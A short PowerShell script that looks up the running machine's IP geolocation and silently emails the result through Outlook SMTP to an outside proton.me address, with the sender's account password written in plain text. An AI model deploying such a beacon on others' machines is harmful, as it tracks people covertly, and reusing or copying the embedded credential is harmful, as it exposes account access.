# Fetch IP-based geolocation
$ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
$jsonContent = $ipInfo | ConvertTo-Json -Depth 10

# Setup SMTP variables (using Outlook.com)
$SmtpServer = 'smtp-mail.outlook.com'
$SmtpUser = 'UsulMadhi@outlook.com'  # Your Outlook.com email address
$SmtpPass = 'Eusebe2000'  # Your Outlook.com password
$Message = $jsonContent

# Email properties
$MailMessage = New-Object System.Net.Mail.MailMessage
$MailMessage.From = 'UsulMadhi@outlook.com'
$MailMessage.To.Add('UsulMadhi@proton.me')
$MailMessage.Subject = 'Complete Geolocation Data'
$MailMessage.Body = $Message

# Send Email
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) # Port for TLS
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
$SMTPClient.Send($MailMessage)
